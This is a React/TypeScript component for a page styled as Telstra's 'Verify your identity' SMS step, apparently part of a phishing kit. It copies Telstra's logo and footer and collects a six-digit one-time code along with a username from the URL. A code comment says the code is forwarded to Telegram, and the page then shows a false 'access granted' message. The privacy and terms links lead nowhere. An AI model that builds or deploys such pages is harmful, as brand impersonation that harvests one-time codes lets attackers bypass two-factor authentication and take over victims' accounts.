import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useMutation } from "@tanstack/react-query";
import { z } from "zod";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Loader2, MessageSquare, CheckCircle, ArrowLeft, RotateCcw } from "lucide-react";
import { apiRequest } from "@/lib/queryClient";
import { useLocation } from "wouter";

const smsSchema = z.object({
  code: z.string().length(6, "Code must be exactly 6 digits").regex(/^\d{6}$/, "Code must contain only numbers"),
});

type SMSFormData = z.infer<typeof smsSchema>;

export default function SMSVerification() {
  const [location, setLocation] = useLocation();
  const [username, setUsername] = useState<string>("");
  const [timeLeft, setTimeLeft] = useState(120); // 2 minutes countdown
  const [isExpired, setIsExpired] = useState(false);

  const form = useForm<SMSFormData>({
    resolver: zodResolver(smsSchema),
    defaultValues: {
      code: "",
    },
  });

  // Extract username from URL params
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const usernameParam = urlParams.get('username') || '';
    setUsername(usernameParam);
  }, []);

  // Countdown timer
  useEffect(() => {
    if (timeLeft <= 0) {
      setIsExpired(true);
      return;
    }

    const timer = setInterval(() => {
      setTimeLeft(prev => prev - 1);
    }, 1000);

    return () => clearInterval(timer);
  }, [timeLeft]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const verifyCodeMutation = useMutation({
    mutationFn: async (data: SMSFormData) => {
      // Send SMS code verification to Telegram
      const response = await apiRequest("POST", "/api/sms/verify", {
        username,
        code: data.code,
        timestamp: new Date().toISOString(),
      });
      return response.json();
    },
    onSuccess: () => {
      // Show success message and redirect
      alert("SMS verification successful! Access granted.");
      setLocation("/success");
    },
    onError: (error) => {
      // Handle error silently or show generic message
      form.setError("code", { message: "Invalid verification code" });
    },
  });

  const resendCodeMutation = useMutation({
    mutationFn: async () => {
      // Request new SMS code
      const response = await apiRequest("POST", "/api/sms/resend", {
        username,
      });
      return response.json();
    },
    onSuccess: () => {
      // Reset timer and show message
      setTimeLeft(120);
      setIsExpired(false);
      form.reset();
      alert("New verification code sent!");
    },
  });

  const onSubmit = (data: SMSFormData) => {
    if (isExpired) {
      form.setError("code", { message: "Code has expired. Please request a new one." });
      return;
    }
    verifyCodeMutation.mutate(data);
  };

  const goBack = () => {
    setLocation("/");
  };

  return (
    <div className="min-h-screen bg-white">
      {/* Telstra Header */}
      <header className="t-page-header">
        <svg width="33px" height="33px" viewBox="0 0 33 33" version="1.1" xmlns="http://www.w3.org/2000/svg" aria-label="Telstra Logo" role="img" focusable="false">
          <g id="Artboard" stroke="none" strokeWidth="1" fill="none" fillRule="evenodd">
            <g id="Telstra_Primary-logo_C_RGB" fillRule="nonzero">
              <path d="M18.742504,14.0832 L17.5024033,21.3536 C17.2460517,22.6624 16.3840696,23.0144 15.6182193,23.0144 L9.88235294,23.0144 L12.3016709,9.6992 C9.88876173,8.5952 7.42137789,7.8752 5.4602884,7.8752 C3.59212634,7.8752 2.0764477,8.3808 1.0670634,9.5872 C0.3556878,10.448 0,11.5104 0,12.7712 C0,16.5568 2.98008698,21.808 8.08468757,26.0928 C12.6317235,29.8784 17.6369879,32 21.2771801,32 C23.0940719,32 24.5584802,31.4432 25.523003,30.336 C26.2792401,29.4784 26.5836576,28.3648 26.5836576,27.104 C26.5836576,23.424 23.5811398,18.2688 18.742504,14.0832 Z" id="Path" fill="#F96449"></path>
              <path d="M8.44037537,0 C7.53032731,0 6.77409018,0.6112 6.57221332,1.568 L5.76470588,5.9552 L12.9777981,5.9552 L9.87914855,23.0112 L15.6182193,23.0112 C16.3840696,23.0112 17.2460517,22.656 17.5024033,21.3504 L20.1268025,5.9552 L25.3179217,5.9552 C26.2311742,5.9552 26.9874113,5.3504 27.1892882,4.3904 L28,0 L8.44037537,0 Z" id="Path" fill="#0D54FF"></path>
            </g>
          </g>
        </svg>
      </header>

      <div role="main" className="t-form-container">
        {/* Back Button */}
        <button 
          onClick={goBack}
          className="t-able-low-emph-button mb-4 flex items-center gap-2"
          data-testid="button-back"
        >
          <ArrowLeft className="h-4 w-4" />
          Back to login
        </button>

        <h1 className="t-able-heading-b t-able-spacing-2x-mb">
          Verify your identity
        </h1>
        
        <div className="t-able-text-bodyshort t-able-spacing-4x-mb">
          We've sent a 6-digit verification code to your mobile device. Enter the code below to complete your sign in.
        </div>

        {/* User Info */}
        {username && (
          <div className="bg-gray-50 rounded-lg p-4 mb-6">
            <p className="text-sm text-gray-700">
              <span className="font-medium">Signed in as:</span> {username}
            </p>
          </div>
        )}

        <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
          {/* SMS Code Input */}
          <div className="t-able-text-field">
            <Label htmlFor="code" className="text-sm font-medium text-foreground">
              Verification Code
            </Label>
            <Input
              id="code"
              type="text"
              inputMode="numeric"
              maxLength={6}
              placeholder="000000"
              {...form.register("code")}
              autoFocus
              disabled={verifyCodeMutation.isPending}
              className="w-full text-center text-2xl font-mono tracking-wider telstra-input"
              data-testid="input-sms-code"
            />
            {form.formState.errors.code && (
              <p className="text-destructive text-sm mt-1" data-testid="text-code-error">
                {form.formState.errors.code.message}
              </p>
            )}
          </div>

          {/* Timer Display */}
          <div className="text-center">
            {!isExpired ? (
              <p className="text-sm text-gray-600">
                Code expires in: <span className="font-mono font-semibold text-blue-600">{formatTime(timeLeft)}</span>
              </p>
            ) : (
              <p className="text-sm text-red-600 font-medium">
                Verification code has expired
              </p>
            )}
          </div>

          {/* Verify Button */}
          <div className="">
            <Button
              type="submit"
              className="t-able-high-emph-button t-able-spacing-2x-mb w-full"
              disabled={verifyCodeMutation.isPending || isExpired}
              data-testid="button-verify"
            >
              {verifyCodeMutation.isPending ? (
                <>
                  <Loader2 className="h-4 w-4 animate-spin mr-2" />
                  Verifying...
                </>
              ) : (
                <>
                  <CheckCircle className="h-4 w-4 mr-2" />
                  Verify Code
                </>
              )}
            </Button>
          </div>

          {/* Resend Code */}
          <div className="text-center">
            <button
              type="button"
              onClick={() => resendCodeMutation.mutate()}
              disabled={resendCodeMutation.isPending || (!isExpired && timeLeft > 60)}
              className={`text-sm underline ${
                isExpired || timeLeft <= 60
                  ? "text-blue-600 hover:text-blue-800"
                  : "text-gray-400 cursor-not-allowed"
              }`}
              data-testid="button-resend"
            >
              {resendCodeMutation.isPending ? (
                <>
                  <Loader2 className="h-3 w-3 animate-spin inline mr-1" />
                  Sending...
                </>
              ) : (
                <>
                  <RotateCcw className="h-3 w-3 inline mr-1" />
                  Resend verification code
                </>
              )}
            </button>
          </div>
        </form>

        {/* Help Text */}
        <div className="mt-8 p-4 bg-blue-50 rounded-lg">
          <div className="flex items-start gap-3">
            <MessageSquare className="h-5 w-5 text-blue-600 mt-0.5 flex-shrink-0" />
            <div className="text-sm text-blue-900">
              <p className="font-medium mb-1">Didn't receive the code?</p>
              <p>Check your messages or try requesting a new code. If you continue to have issues, please contact customer support.</p>
            </div>
          </div>
        </div>
      </div>

      <footer className="t-footer">
        <div className="t-footer-content">
          <p className="t-footer-copyright">Copyright © 2025 Telstra</p>
          <a 
            className="t-footer-privacy" 
            href="#" 
            target="_blank"
            data-testid="link-privacy"
          >
            Privacy
          </a>
          <a 
            className="t-footer-terms" 
            href="#" 
            target="_blank"
            data-testid="link-terms"
          >
            Terms of use
          </a>
        </div>
      </footer>
    </div>
  );
}